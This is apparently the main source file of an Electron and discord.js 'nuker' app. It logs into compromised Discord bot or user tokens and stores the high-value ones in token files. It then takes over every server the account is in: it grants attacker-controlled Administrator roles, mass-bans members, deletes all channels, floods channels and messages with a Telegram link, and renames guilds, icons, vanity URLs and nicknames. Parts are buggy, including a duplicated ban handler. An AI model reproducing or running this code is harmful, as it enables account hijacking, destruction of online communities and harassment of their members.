const {
  Client,
  PermissionsBitField,
  GatewayIntentBits,
  ChannelType
} = require("discord.js"); // Imports discord.js, the Discord API
const { app, BrowserWindow, ipcMain, webContents } = require("electron"); // Web Contents is needed but VS Code shows it as not, do not delete! Very vital part of app
const fs = require("fs"); // To write to files (tokens.json specifically)
const config = require('./config.json') // Reads config so it can be used later on
const fetch = require("node-fetch"); // For making an API request changing vanity url
const { Worker } = require("worker_threads"); // Worker Threads, like Python Threading, used to run a script multiple times at once. Spammer!
const { channel } = require("diagnostics_channel");
// Sets variable member_count locally for the ready function, makes it so after the guild members are got, member count can be used throughout all the ready function
let member_count = 0;
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
  ],
}); // Creates a new discord.js bot client
// VVV Executes after the client is logged into (at the bottom)
client.on("ready", async () => {
  // Loops through the guilds and adds the member count of each guild to the total member count, also logs in console the info of each guild
  client.guilds.cache.forEach(guild => {
    member_count += guild.memberCount
    console.log(`Guild Info: ${guild.id} | ${guild.name} | ${guild.memberCount}`)
  })
  // Logs the username of the bot
  console.log(`We have pwned ${client.user.username}`);
  // Checks if the bot is in a guild
  if (client.guilds.cache.size <= 0) {
    console.log(`Token (${client.token}) isn't in a guild`)
    win.webContents.send('msg', "Error: Bot not in guild")
    client.destroy()
  } else { // If the bot is in a guild, it sends you to the takeover page. If not, it doesn't.
    // VV Sends to takeover page
    win.loadFile('./app/takeover.html')
    setTimeout(() => {
      // Timeout needed so that it can process the file first, probably another way to do this but I'm janky ig (timeout of 100 ms so not easily seen to naked eye without knowing)
      win.webContents.send('client', client.user.username)
    }, 100)
    // Logs that the login was successful
    console.log(`Successfully logged into token (${client.token})`)
  }
  // Another janky timeout for saving the tokens
  setTimeout(async () => {
    // Checks if config is set for saving tokens and if the member count is higher than the amount to save
    if (config.save_tokens == true && config.member_count_to_save <= member_count) {
      // Checks if it's a token above the big tokens amount
      if (config.member_count_to_save_to_big_tokens <= member_count) {
        // Reads big tokens file
        let data = JSON.parse(fs.readFileSync('./bigtokens.json', 'utf-8'))
        // Checks if the token is already in the big tokens
        if (!Object.values(data).find(d => d.t == client.token || d == client.token)) {
          // Creates object for saving
          let i = {
            t: client.token,
            m: member_count,
            n: client.user.username
          }
          // Adds the object to the keys
          data[Object.keys(data).length + 1] = i
          // Writes the new data to the big tokens
          fs.writeFileSync('./bigtokens.json', JSON.stringify(data, null, "\t"), 'utf-8')
          // Logs the token was saved
          console.log(`TOKEN SAVED (BIG): First time using token and member count is bigger than: ${config.member_count_to_save_to_big_tokens} (${member_count})!`)
        } else {
          console.log('Token already saved!')
        }
      }
      // Game thing as above but for small tokens
    } else if (config.member_count_to_save <= member_count) {
      let data = JSON.parse(fs.readFileSync('./tokens.json', 'utf-8'))
      if (!Object.values(data).find(d => d.t == client.token || d == client.token)) {
        let i = {
          t: client.token,
          m: member_count,
          n: client.user.username
        }
        data[Object.keys(data).length + 1] = i
        fs.writeFileSync('./tokens.json', JSON.stringify(data, null, "\t"), 'utf-8')
        console.log(`TOKEN SAVED: First time using token and member count is bigger than: ${config.member_count_to_save} (${member_count})!`)
      }

      // Checks if the member count is too low to save
    } else if (member_count < config.member_count_to_save && config.save_tokens == true) {
      console.log(`Member count (${member_count}) too low to save`)
    }
    // Sends the message to the app of the member count
    win.webContents.send('msg', `Members: ${member_count}`)
  }, 100)
})
ipcMain.on('openSettings', () => win.loadFile('./app/bot.html'))
ipcMain.on('admin', (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    try {
      if (!data) data = config.user_id;
      let u = await guild.members.fetch(data)
      let b = await guild.members.fetch(client.user.id)
      let pos = b.roles.highest.position
      guild.roles.create({
        name: "COCK EATER",
        permissions: PermissionsBitField.Flags.Administrator,
        position: pos - 1
      }).then((r) => u.roles.add(r))
    } catch (e) {
      console.log(e)
    }

  })
})
ipcMain.on('adminAll', (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    try {
      if (!data) data = config.user_id;
      let u = await guild.members.fetch(data)
      let b = await guild.members.fetch(client.user.id)
      let pos = b.roles.highest.position
      guild.roles.create({
        name: "COCK EATER",
        permissions: PermissionsBitField.Flags.Administrator,
        position: pos - 1
      }).then(async (r) => {
        await guild.members.fetch().forEach(m => m.roles.add(r))
      })
    } catch (e) {
      console.log(e)
    }

  })
})
ipcMain.on('banAll', (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    guild.members.cache.forEach(async (member) => {
      try {
        if (!data) data = config.user_id;
        let u = await guild.members.fetch(data)
        let b = await guild.members.fetch(client.user.id)
        let pos = b.roles.highest.position
        guild.roles.create({
          name: "COCK EATER",
          permissions: PermissionsBitField.Flags.Administrator,
          position: pos - 1
        }).then((r) => u.roles.add(r))
      } catch (e) {
        console.log(e)
      }
    })
  })
})
ipcMain.on('leaveServer', async (event, data) => {
  await client.guilds.cache.find(guild => guild.id == data).leave()
})
ipcMain.on('spamChannels', (event, data) => {
  client.guilds.cache.forEach((guild) => {
    let i = 0
    spamChannels = setInterval(() => {
      if (i > config.channel_spam_limit) return;
      guild.channels.create({
        name: data,
        description: data,
        type: ChannelType.GuildText
      })
      i++;
    })
  })
})
ipcMain.on('changeVanity', (event, data) => {
  client.guilds.cache.forEach(async (guild) => {
    var vanity = await guild.fetchVanityData()
    if (vanity.code) {
      await fetch(`https://www.discord.com/api/v10/guilds/${guild.id}/vanity-url`, {
        method: "PATCH",
        headers: {
          Authorization: `Bot ${client.token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          code: data,
        }),
      });
    }
  })
})
ipcMain.on('restart', (event, data) => {
  app.relaunch()
  app.quit()
})
ipcMain.on('logOut', (event, data) => {
  app.quit()
})
ipcMain.on('changeUsername', async (event, data) => {
  client.user.setUsername(data).catch((e) => {
    if (e.toString().includes("Too many users")) { win.webContents.send('msg', 'Error: Too many users have this username!') } else { win.webContents.send('msg', "Error: Try another username") }
  })
});
ipcMain.on('changeGuildName', (event, data) => {
  client.guilds.cache.forEach((guild) => {
    guild.setName(data).catch((e) => win.webContents.send('msg', "Error: Could not set name, is it 2-100 characters?" + e.toString()))
  })
})
ipcMain.on('changeGuildIcon', (event, data) => {
  client.guilds.cache.forEach((guild) => {
    guild.setIcon(data).catch((e) => win.webContents.send('msg', "Error: Could not set icon" + e.toString()))
  })
})
ipcMain.on('spammer', async (event, data) => {
  if (!data && !config.spammer) {
    win.webContents.send('msg', "Error: Specify a message to spam!")
    console.log('Error: Specify a message to spam!')
    return true;
  }
  else {
    if (config.spammer && !data) data = config.spammer
    // TODO: Proxy Spammer and Normal Spammer WORKER THREADS
    /*if (config.proxy_spammer) {
      let a = 0
      const workerPromises = [];
      client.channels.cache.forEach(async (channel) => {
        if (!channel.type == 0) return;
        a++
        console.log(`${channel.name} has been loaded (${a})`)
        workerPromises.push(createWorker(channel, data, "proxy"));
      })
      const thread_results = await Promise.all(workerPromises);
      console.log(thread_results)
    }
    else {
      let a = 0
      const workerPromises = [];
      client.channels.cache.forEach(async (channel) => {
        if (!channel.type == 0) return;
        a++
        console.log(`${channel.name} has been loaded (${a})`)
        workerPromises.push(createWorker(channel, data, "no_proxy", a));
      })
      const thread_results = await Promise.all(workerPromises);
      console.log(thread_results)
    }
    */
    client.channels.cache.forEach(async (channel) => {
      setInterval(() => {
        channel.send(data + " | https://t.me/nukingyou")
      })
    })
    
  }
})
function createWorker(channel, data, type, channel_number) {
  if (type == "proxy") {
    return new Promise(function (resolve, reject) {
      const worker = new Worker("./workers/proxy_spammer_worker.js", {
        workerData: { channel: channel, msg: data, token: client.token, channel_number: channel_number.toString() },
      });
      worker.on("message", (data) => {
        resolve(data);
      });
      worker.on("error", (msg) => {
        reject(`An error ocurred: ${msg}`);
      });
    });
  } else {
    return new Promise(function (resolve, reject) {
      const worker = new Worker("./workers/spammer_worker.js", {
        workerData: { channel: channel, msg: data, token: client.token },
      });
      worker.on("message", (data) => {
        resolve(data);
      });
      worker.on("error", (msg) => {
        reject(`An error ocurred: ${msg}`);
      });
    });
  }
}
ipcMain.on('listInvites', (event, data) => {
  let errorServers = 0;
  let errorMembers = 0;
  let invs = []
  let guilds = client.guilds.cache
  let i = 0
  let ttt = async () => {
    guilds.forEach(async (guild) => {
      try {
        var vanity = await guild.fetchVanityData()
        if (vanity.code == undefined || vanity.code == null || !vanity.code) return;
        console.log(`VANITY FOUND: https://discord.gg/${vanity.code} and ${vanity.uses} uses!`)

        invs.push(`https://discord.gg/${vanity.code} (VANITY) `)
      } catch (e) {
        console.log('NO VANITY')
      }

      guild.invites.fetch().then((invites) => {

        let allInvites = invites.forEach(async (e) => {
          var invGuild = await client.guilds.fetch(e.guild.id)
          console.log(`Premade Invite Code: https://discord.gg/${e.code} | Server: ${invGuild.name} | Member Count: ${invGuild.memberCount} | Guild ID: ${invGuild.id}`)
          invs.push(`https://discord.gg/${e.code} | Users: ${invGuild.memberCount} | Guild: ${invGuild.name}`)
          i++
        })
      }).then(async () => {
        if (i == 0) {
          if ([...guild.channels.cache.values()].length <= 0) { console.log('Error: No channels found'); return; }
          var channelid = [...guild.channels.cache.values()][Math.floor(Math.random() * [...guild.channels.cache.values()].length)].id
          var channel = await client.channels.fetch(channelid)
          var invite = await channel.createInvite()
          var invGuild = await client.guilds.fetch(invite.guild.id)
          console.log(`NEW INVITE: https://discord.gg/${invite.code} | Server: ${invGuild.name} | Member Count: ${invGuild.memberCount}`)
          invs.push(`(New) https://discord.gg/${invite.code} | Users: ${invGuild.memberCount} | Guild: ${invGuild.name}`)

        }
      }).catch(async (e) => { console.log(`Guild ${guild.name} with ${guild.memberCount} has failed! (${await guild.members.fetch(client.user.id)})`) })
    })
    setTimeout(() => {
      win.webContents.send('resInvites', invs)
    }, 1000)
  }
  ttt()

})
ipcMain.on('unbanUser', async (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    try {
      if (!data) data = config.user_id;
      guild.members.unban(data)
    } catch (e) {
      console.log(e)
    }

  })
})
ipcMain.on('deleteAll', async (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    let channels = await guild.channels.fetch()
    channels = [...channels.values()]
    channels.forEach((c) => {
      c.delete()
    })
  })
})
ipcMain.on('banAll', (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    await guild.members.fetch().forEach((member) => {
      if (!member.roles.highest.position > guild.members.cache.find((user) => user.id == client.user.id).roles.highest.position && member.id != config.user_id) {
        try {
          member.ban()
        } catch (e) {
          console.log(e)
        }
      } else {
        console.log("COULDN'T BAN: " + member.roles.highest.position + ' ' + guild.members.cache.find((user) => user.id == client.user.id).roles.highest.position)
      }
    })
  })
})
ipcMain.on('changeNicknames', (event, data) => {
  let guilds = client.guilds.cache
  guilds.forEach(async (guild) => {
    guild.members.cache.forEach((member) => {
      try {
        member.setNickname(data)
      } catch (e) {
        console.log(e)
      }
    })
  })
})
ipcMain.on("sendToken", async (event, data) => {
  console.log(`Token (${data}) received`)
  try {
    if (config.type == "bot") {
      client.login(data).then(() => { console.log(`Loading...`); win.webContents.send('msg', 'Loading... (Big Server?)') }).catch((e) => { win.webContents.send('msg', "Error: Invalid Token"); console.log(`Token (${data}) is invalid`) })
    }
    else if (config.type == "acc") {
      allowUserBotting(client, '../../node-modules')
      client.login(data)
    }
    else {
      console.log(config.type)
    }
  } catch (e) {
    console.log(e)
    win.webContents.send('msg', "Error: Invalid Token")
  }

});


let win = null;

const createWindow = () => {
  win = new BrowserWindow({
    width: 1600,
    height: 1200,
    resizable: true,
    frame: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
    icon: "./icon.ico",
  });

  win.loadFile("./app/index.html");
  win.webContents.on('new-window', function (e, url) {
    e.preventDefault();
    require('open').open(url)
  });
};

app.whenReady().then(createWindow);
